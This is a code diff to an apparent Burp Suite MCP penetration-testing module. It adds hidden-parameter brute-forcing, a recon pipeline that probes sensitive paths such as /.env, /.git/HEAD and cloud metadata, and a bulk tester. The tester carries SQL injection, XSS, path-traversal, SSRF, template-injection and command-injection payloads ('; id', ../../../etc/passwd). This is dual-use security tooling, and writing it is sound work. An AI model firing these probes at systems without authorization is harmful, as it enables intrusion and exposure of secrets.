@@ -1,5 +1,6 @@
 """Adaptive scan engine — discover attack surface and auto-probe with knowledge-driven detection."""
 
+import asyncio
 import json
 from functools import lru_cache
 from pathlib import Path
@@ -24,6 +25,66 @@ def _load_knowledge(category: str) -> dict | None:
 
 # Reference-only files (no probes, skip in auto_probe)
 _REFERENCE_ONLY = {"tech_vulns"}
+
+# Parameter name to vulnerability type mapping for attack prioritization
+_PARAM_RISK_MAP = {
+    "sqli_idor": ["id", "uid", "pid", "user_id", "account_id", "order_id", "item_id", "product_id", "num", "page"],
+    "xss_sqli": ["search", "q", "query", "keyword", "name", "comment", "message", "text", "content"],
+    "redirect_ssrf": ["url", "redirect", "next", "return", "goto", "dest", "callback", "uri", "link", "href", "forward"],
+    "lfi": ["file", "path", "dir", "page", "include", "template", "load", "read", "doc", "download"],
+    "cmdi": ["cmd", "command", "exec", "run", "ping", "ip", "hostname"],
+    "ssti": ["template", "render", "view", "layout", "preview", "expression", "eval"],
+}
+
+# Common hidden parameter wordlists
+_COMMON_PARAMS = [
+    "id", "page", "search", "q", "query", "name", "email", "user", "username",
+    "password", "token", "key", "api_key", "apikey", "secret", "auth", "session",
+    "redirect", "url", "next", "return", "callback", "file", "path", "action",
+    "type", "format", "lang", "debug", "test", "admin", "role", "sort", "order",
+    "limit", "offset", "filter", "category", "status", "view", "mode", "cmd",
+    "command", "input", "output", "data", "value", "template", "include", "v",
+    "version", "config", "setting", "env", "verbose", "force", "confirm",
+]
+
+_EXTENDED_PARAMS = _COMMON_PARAMS + [
+    "account", "profile", "uid", "pid", "sid", "tid", "cid", "oid", "bid",
+    "item", "product", "article", "post", "comment", "message", "notification",
+    "task", "project", "workspace", "organization", "team", "report", "export",
+    "import", "log", "audit", "level", "app", "client", "client_id",
+    "client_secret", "grant_type", "response_type", "scope", "state", "nonce",
+    "redirect_uri", "return_url", "continue", "goto", "forward", "dest",
+    "destination", "redir", "checkout", "payment", "amount", "price", "quantity",
+    "coupon", "discount", "promo", "address", "phone", "zip", "country", "ip",
+    "host", "port", "domain", "subdomain", "method", "endpoint", "resource",
+    "field", "column", "table", "database", "schema", "index", "timeout",
+    "retry", "cache", "refresh", "delete", "remove", "update", "create",
+    "edit", "submit", "process", "validate", "verify", "check", "preview",
+    "draft", "publish", "upload", "download", "fetch", "load", "read", "write",
+]
+
+
+def _matches_param(param_lower: str, target: str) -> bool:
+    """Check if parameter name matches target, with word-boundary awareness for short names."""
+    if param_lower == target:
+        return True
+    if len(target) <= 3:
+        return (
+            param_lower.startswith(target + "_") or
+            param_lower.endswith("_" + target) or
+            f"_{target}_" in param_lower
+        )
+    return target in param_lower
+
+
+def _classify_param_risk(param_name: str) -> list[str]:
+    """Classify a parameter's vulnerability risk based on its name."""
+    name = param_name.lower()
+    risks = []
+    for vuln_type, names in _PARAM_RISK_MAP.items():
+        if name in names or any(_matches_param(name, n) for n in names):
+            risks.append(vuln_type.replace("_", "/").upper())
+    return risks
 
 
 def _load_all_knowledge(categories: list[str] | None = None) -> list[dict]:
@@ -109,6 +170,24 @@ def register(mcp: FastMCP):
             for t in targets:
                 lines.append(f"  {t.get('method', '?'):6s} {t.get('path', '?')} -> {t.get('parameter', '?')} ({t.get('location', '?')})")
             lines.append(f"\nTo probe all: auto_probe(session=\"{session}\", targets={_compact_targets(targets)})")
+
+        # Attack priority summary based on parameter name heuristics
+        priorities = []
+        for ep in endpoints_sorted:
+            ep_risks = set()
+            for p in ep.get("parameters", []):
+                risks = _classify_param_risk(p.get("name", ""))
+                ep_risks.update(risks)
+            if ep_risks:
+                priorities.append((ep, sorted(ep_risks)))
+
+        if priorities:
+            lines.append(f"\nATTACK PRIORITIES:")
+            for i, (ep, risks) in enumerate(priorities[:10], 1):
+                risk_str = ", ".join(risks)
+                path = ep.get("path", "?")
+                method = ep.get("method", "?")
+                lines.append(f"  {i}. {method} {path} -> {risk_str}")
 
         return "\n".join(lines)
 
@@ -331,4 +410,427 @@ def register(mcp: FastMCP):
         for r in data.get("results", []):
             title = f" [{r['title']}]" if r.get("title") else ""
             lines.append(f"  {r.get('method', '?'):6s} {r.get('path', '?'):<40s} {r['status']} | {r['length']:>6}B | {r['time_ms']:>4}ms{title}")
+        return "\n".join(lines)
+
+    # ── New discovery & workflow tools ────────────────────────────────
+
+    @mcp.tool()
+    async def discover_hidden_parameters(
+        session: str,
+        method: str = "GET",
+        path: str = "/",
+        wordlist: str = "common",
+        param_type: str = "query",
+        baseline_value: str = "1",
+    ) -> str:
+        """Discover hidden/undocumented parameters by brute-forcing parameter names (Arjun-style).
+        Sends requests adding each candidate parameter and detects anomalies
+        (status change, length change, new content, reflection).
+
+        Args:
+            session: Session name
+            method: HTTP method (GET or POST)
+            path: Endpoint path to test
+            wordlist: 'common' (~60 params) or 'extended' (~150 params)
+            param_type: Where to add params - 'query', 'body', or 'json'
+            baseline_value: Value to use for test parameters (default '1')
+        """
+        candidates = _EXTENDED_PARAMS if wordlist == "extended" else _COMMON_PARAMS
+
+        # Send baseline request
+        baseline_req: dict = {"session": session, "method": method, "path": path}
+        if param_type == "body":
+            baseline_req["body"] = ""
+            baseline_req["headers"] = {"Content-Type": "application/x-www-form-urlencoded"}
+        elif param_type == "json":
+            baseline_req["json_body"] = {}
+            baseline_req["headers"] = {"Content-Type": "application/json"}
+
+        baseline_resp = await client.post("/api/session/request", json=baseline_req)
+        if "error" in baseline_resp:
+            return f"Error getting baseline: {baseline_resp['error']}"
+
+        baseline_status = baseline_resp.get("status", 0)
+        baseline_length = baseline_resp.get("response_length", 0)
+        baseline_body = baseline_resp.get("response_body", "")[:500]
+
+        discovered = []
+        tested = 0
+
+        for param in candidates:
+            tested += 1
+            req: dict = {"session": session, "method": method}
+
+            if param_type == "query":
+                sep = "&" if "?" in path else "?"
+                req["path"] = f"{path}{sep}{param}={baseline_value}"
+            elif param_type == "body":
+                req["path"] = path
+                req["data"] = f"{param}={baseline_value}"
+                req["headers"] = {"Content-Type": "application/x-www-form-urlencoded"}
+            elif param_type == "json":
+                req["path"] = path
+                req["json_body"] = {param: baseline_value}
+                req["headers"] = {"Content-Type": "application/json"}
+
+            resp = await client.post("/api/session/request", json=req)
+            if "error" in resp:
+                continue
+
+            status = resp.get("status", 0)
+            length = resp.get("response_length", 0)
+            body = resp.get("response_body", "")[:500]
+
+            reasons = []
+            if status != baseline_status:
+                reasons.append(f"status {baseline_status}->{status}")
+            if baseline_length > 0:
+                diff_pct = abs(length - baseline_length) / baseline_length * 100
+                if diff_pct > 10:
+                    sign = "+" if length > baseline_length else "-"
+                    reasons.append(f"{sign}{diff_pct:.0f}% length")
+            if param in body and param not in baseline_body:
+                reasons.append("reflected")
+
+            if reasons:
+                discovered.append({"name": param, "status": status, "length": length, "reasons": reasons})
+
+        lines = [f"HIDDEN PARAMETER DISCOVERY"]
+        lines.append(f"Target: {method} {path}")
+        lines.append(f"Baseline: {baseline_status} ({baseline_length} bytes)")
+        lines.append(f"Tested: {tested} parameters ({wordlist})\n")
+
+        if discovered:
+            lines.append(f"DISCOVERED ({len(discovered)}):")
+            for d in discovered:
+                reasons_str = ", ".join(d["reasons"])
+                lines.append(f"  {d['name']:<20} -> {d['status']}, {d['length']}B ({reasons_str})")
+        else:
+            lines.append("No hidden parameters found.")
+
+        lines.append(f"\nNO CHANGE: {tested - len(discovered)} parameters matched baseline")
+        return "\n".join(lines)
+
+    @mcp.tool()
+    async def full_recon(
+        session: str,
+        depth: str = "standard",
+    ) -> str:
+        """Full reconnaissance pipeline in ONE call. Combines tech detection, endpoint mapping,
+        security header audit, JS secret scanning, robots.txt, and sensitive file discovery.
+
+        Depth levels:
+        - quick: Tech stack + unique endpoints + security headers
+        - standard: + JS secrets + robots.txt + forms
+        - deep: + sensitive file discovery + all endpoint injection points
+
+        Args:
+            session: Session name with base_url configured
+            depth: 'quick', 'standard', or 'deep'
+        """
+        lines = [f"FULL RECON (depth: {depth})\n"]
+
+        # Step 1: Quick scan the root page
+        root_req: dict = {"session": session, "method": "GET", "path": "/", "analyze": True}
+        root_resp = await client.post("/api/session/request", json=root_req)
+        if "error" in root_resp:
+            return f"Error: {root_resp['error']}"
+
+        root_index = root_resp.get("proxy_index", -1)
+        analysis = root_resp.get("analysis", {})
+
+        # Tech stack
+        techs = analysis.get("tech_stack", {}).get("technologies", [])
+        if techs:
+            lines.append(f"TECH STACK: {', '.join(techs)}")
+
+        # Security headers with scoring
+        present = []
+        missing = []
+        sec_headers = analysis.get("tech_stack", {}).get("security_headers", {})
+        for h, v in sec_headers.items():
+            (present if v else missing).append(h)
+
+        from burpsuite_mcp.tools.analyze import _score_security_headers
+        lines.append(_score_security_headers(present, missing))
+
+        # Endpoints
+        ep_data = await client.get("/api/analysis/unique-endpoints", params={"limit": "100"})
+        endpoints = ep_data.get("endpoints", []) if "error" not in ep_data else []
+        lines.append(f"\nENDPOINTS: {len(endpoints)} unique")
+        for ep in endpoints[:15]:
+            params = ep.get("parameters", [])
+            param_str = f" (params: {', '.join(params)})" if params else ""
+            lines.append(f"  [{ep.get('status_code', '?')}] {ep['endpoint']}{param_str}")
+        if len(endpoints) > 15:
+            lines.append(f"  ... and {len(endpoints) - 15} more")
+
+        if depth in ("standard", "deep"):
+            # JS secrets: fetch page resources then scan
+            if root_index >= 0:
+                page_res = await client.post("/api/resources/fetch-page", json={"index": root_index})
+                if "error" not in page_res:
+                    fetched = page_res.get("newly_fetched", [])
+                    js_secrets = []
+                    for res in fetched[:5]:
+                        idx = res.get("proxy_index", -1)
+                        if idx >= 0 and res.get("url", "").endswith(".js"):
+                            sec_data = await client.post("/api/analysis/js-secrets", json={"index": idx})
+                            if "error" not in sec_data:
+                                for s in sec_data.get("secrets", []):
+                                    js_secrets.append(s)
+
+                    if js_secrets:
+                        lines.append(f"\nJS SECRETS: {len(js_secrets)} found")
+                        for s in js_secrets[:10]:
+                            lines.append(f"  [{s.get('severity', '?')}] {s.get('type', '?')}: {s.get('match', '?')[:60]}")
+
+            # Robots.txt
+            robots = await client.post("/api/session/request", json={
+                "session": session, "method": "GET", "path": "/robots.txt",
+            })
+            if "error" not in robots and robots.get("status") == 200:
+                body = robots.get("response_body", "")
+                disallowed = [l.split(":")[1].strip() for l in body.split("\n")
+                              if l.lower().startswith("disallow:") and l.split(":")[1].strip()]
+                if disallowed:
+                    lines.append(f"\nROBOTS.TXT: {len(disallowed)} disallowed")
+                    for d in disallowed[:10]:
+                        lines.append(f"  {d}")
+
+        if depth == "deep":
+            # Sensitive file discovery (top 15 paths)
+            sensitive_paths = [
+                "/.git/HEAD", "/.env", "/robots.txt", "/.htaccess",
+                "/web.config", "/phpinfo.php", "/actuator", "/actuator/env",
+                "/swagger.json", "/api-docs", "/openapi.json",
+                "/.svn/entries", "/.DS_Store", "/server-status", "/debug/",
+            ]
+            found_files = []
+            for sp in sensitive_paths:
+                resp = await client.post("/api/session/request", json={
+                    "session": session, "method": "GET", "path": sp,
+                })
+                if "error" not in resp:
+                    status = resp.get("status", 0)
+                    length = resp.get("response_length", 0)
+                    if status == 200 and length > 0:
+                        found_files.append(f"{sp} ({length}B)")
+                    elif status == 403:
+                        found_files.append(f"{sp} (403 - exists but blocked)")
+
+            if found_files:
+                lines.append(f"\nSENSITIVE FILES: {len(found_files)} found")
+                for f in found_files:
+                    lines.append(f"  {f}")
+
+        # Attack priorities
+        priorities = []
+        for ep in endpoints:
+            ep_risks = set()
+            for p in ep.get("parameters", []):
+                risks = _classify_param_risk(p)
+                ep_risks.update(risks)
+            if ep_risks:
+                priorities.append((ep, sorted(ep_risks)))
+
+        if priorities:
+            lines.append(f"\nATTACK PRIORITIES:")
+            for i, (ep, risks) in enumerate(priorities[:10], 1):
+                lines.append(f"  {i}. {ep['endpoint']} -> {', '.join(risks)}")
+
+        return "\n".join(lines)
+
+    @mcp.tool()
+    async def bulk_test(
+        session: str,
+        vulnerability: str,
+        targets: list[dict] | None = None,
+        max_endpoints: int = 10,
+    ) -> str:
+        """Test multiple endpoints for a specific vulnerability type in ONE call.
+        Auto-selects relevant payloads from knowledge base.
+
+        Args:
+            session: Session name
+            vulnerability: Vulnerability type - 'sqli', 'xss', 'lfi', 'open_redirect', 'ssrf', 'ssti', 'command_injection'
+            targets: [{"path": "/api/users", "parameter": "id", "method": "GET"}] - auto-discover if None
+            max_endpoints: Max endpoints to test (default 10)
+        """
+        # Quick payload sets per vulnerability type
+        payload_sets = {
+            "sqli": {
+                "payloads": ["'", "1 OR 1=1--", "1' AND SLEEP(3)--", "1 UNION SELECT NULL--"],
+                "indicators": ["sql", "syntax", "mysql", "ora-", "postgresql", "sqlite", "unclosed quotation"],
+            },
+            "xss": {
+                "payloads": ["<script>alert(1)</script>", "\" onmouseover=alert(1)", "<img src=x onerror=alert(1)>", "'-alert(1)-'"],
+                "indicators": [],  # Check reflection
+            },
+            "lfi": {
+                "payloads": ["../../../etc/passwd", "....//....//....//etc/passwd", "..%252f..%252f..%252fetc/passwd", "/etc/passwd"],
+                "indicators": ["root:x:", "root:*:", "/bin/bash", "/bin/sh"],
+            },
+            "open_redirect": {
+                "payloads": [],  # Populated dynamically with Collaborator URL
+                "indicators": [],  # Checked via Location header + Collaborator
+                "uses_collaborator": True,
+            },
+            "ssrf": {
+                "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "http://[::1]/"],
+                "indicators": ["ami-id", "instance-id", "ssh", "openssl"],
+            },
+            "ssti": {
+                "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
+                "indicators": ["49"],  # 7*7=49
+            },
+            "command_injection": {
+                "payloads": ["; id", "| id", "$(id)", "`id`"],
+                "indicators": ["uid=", "gid=", "groups="],
+            },
+        }
+
+        if vulnerability not in payload_sets:
+            return f"Error: Unknown vulnerability '{vulnerability}'. Options: {', '.join(payload_sets.keys())}"
+
+        vconfig = payload_sets[vulnerability]
+
+        # For open_redirect, generate Collaborator-based payloads
+        collab_host = ""
+        if vconfig.get("uses_collaborator"):
+            collab = await client.post("/api/collaborator/payload")
+            if "error" in collab:
+                return f"Error: open_redirect requires Burp Collaborator: {collab['error']}"
+            collab_url = collab.get("payload", "")
+            collab_host = collab_url.replace("http://", "").replace("https://", "").split("/")[0]
+            if not collab_host:
+                return "Error: Could not get Collaborator host."
+            vconfig["payloads"] = [
+                f"https://{collab_host}",
+                f"//{collab_host}",
+                f"\\/\\/{collab_host}",
+                f"//{collab_host}%2F%2F",
+            ]
+
+        # Auto-discover targets if not provided
+        if not targets:
+            ep_data = await client.get("/api/analysis/unique-endpoints", params={"limit": str(max_endpoints * 3)})
+            if "error" in ep_data:
+                return f"Error: {ep_data['error']}"
+            auto_targets = []
+            for ep in ep_data.get("endpoints", []):
+                params = ep.get("parameters", [])
+                if params:
+                    endpoint = ep.get("endpoint", "")
+                    # Extract method and path
+                    parts = endpoint.split(" ", 1)
+                    ep_method = parts[0] if len(parts) > 1 else "GET"
+                    ep_path = parts[1] if len(parts) > 1 else parts[0]
+                    for p in params:
+                        auto_targets.append({"method": ep_method, "path": ep_path, "parameter": p})
+            targets = auto_targets[:max_endpoints]
+
+        if not targets:
+            return "No targets found. Browse the target first or provide targets manually."
+
+        lines = [f"BULK TEST: {vulnerability} across {len(targets)} targets\n"]
+        findings = []
+        total_requests = 0
+
+        for t in targets[:max_endpoints]:
+            t_method = t.get("method", "GET")
+            t_path = t.get("path", "/")
+            t_param = t.get("parameter", "")
+            if not t_param:
+                continue
+
+            # Baseline
+            baseline_resp = await client.post("/api/session/request", json={
+                "session": session, "method": t_method, "path": t_path,
+            })
+            if "error" in baseline_resp:
+                continue
+            baseline_status = baseline_resp.get("status", 0)
+            baseline_length = baseline_resp.get("response_length", 0)
+            baseline_body = baseline_resp.get("response_body", "")
+
+            for payload in vconfig["payloads"]:
+                total_requests += 1
+                sep = "&" if "?" in t_path else "?"
+                inject_path = f"{t_path}{sep}{t_param}={payload}"
+
+                resp = await client.post("/api/session/request", json={
+                    "session": session, "method": t_method, "path": inject_path,
+                })
+                if "error" in resp:
+                    continue
+
+                status = resp.get("status", 0)
+                length = resp.get("response_length", 0)
+                body = resp.get("response_body", "")
+                time_ms = resp.get("time_ms", 0)
+
+                finding_reasons = []
+
+                # Check indicators (only flag if NEW — not present in baseline)
+                for ind in vconfig["indicators"]:
+                    if ind.lower() in body.lower() and ind.lower() not in baseline_body.lower():
+                        finding_reasons.append(f"indicator: {ind}")
+
+                # Check reflection for XSS
+                if vulnerability == "xss" and payload in body:
+                    finding_reasons.append("reflected in response")
+
+                # Check Location header for redirects (using Collaborator URL)
+                if vulnerability == "open_redirect" and collab_host:
+                    for h in resp.get("response_headers", []):
+                        if h["name"].lower() == "location" and collab_host in h["value"]:
+                            finding_reasons.append(f"redirect to Collaborator: {h['value'][:50]}")
+
+                # Check timing anomaly
+                if time_ms > 3000 and "SLEEP" in payload.upper():
+                    finding_reasons.append(f"timing: {time_ms}ms")
+
+                # Status anomaly
+                if status == 500 and baseline_status != 500:
+                    finding_reasons.append("500 error (possible injection)")
+
+                if finding_reasons:
+                    severity = "HIGH" if any("indicator" in r or "timing" in r for r in finding_reasons) else "MEDIUM"
+                    findings.append({
+                        "severity": severity,
+                        "endpoint": f"{t_method} {t_path}",
+                        "parameter": t_param,
+                        "payload": payload,
+                        "reasons": finding_reasons,
+                    })
+
+        if findings:
+            lines.append(f"FINDINGS ({len(findings)}):")
+            for f in findings:
+                reasons_str = ", ".join(f["reasons"])
+                lines.append(f"  [{f['severity']}] {f['endpoint']}?{f['parameter']}=")
+                lines.append(f"    Payload: {f['payload']}")
+                lines.append(f"    Evidence: {reasons_str}")
+                lines.append("")
+        else:
+            lines.append("No findings.")
+
+        # For open_redirect: poll Collaborator to confirm real interactions
+        if vulnerability == "open_redirect" and collab_host:
+            await asyncio.sleep(5)
+            interactions_data = await client.get("/api/collaborator/interactions")
+            interactions = interactions_data.get("interactions", []) if "error" not in interactions_data else []
+            if interactions:
+                lines.append(f"\nCOLLABORATOR CONFIRMED: {len(interactions)} interaction(s) detected")
+                for hit in interactions[:5]:
+                    lines.append(f"  [{hit.get('type', '?')}] from {hit.get('client_ip', '?')}")
+                lines.append("  Open redirect CONFIRMED — server followed redirect to Collaborator.")
+            elif findings:
+                lines.append(f"\nNo Collaborator interactions (Location header showed redirect but server may not follow).")
+
+        clean = len(targets) - len(set(f"{f['endpoint']}?{f['parameter']}" for f in findings))
+        lines.append(f"CLEAN: {clean} endpoints showed no anomalies")
+        lines.append(f"TESTED: {len(targets)} targets, {total_requests} requests total")
+
         return "\n".join(lines)
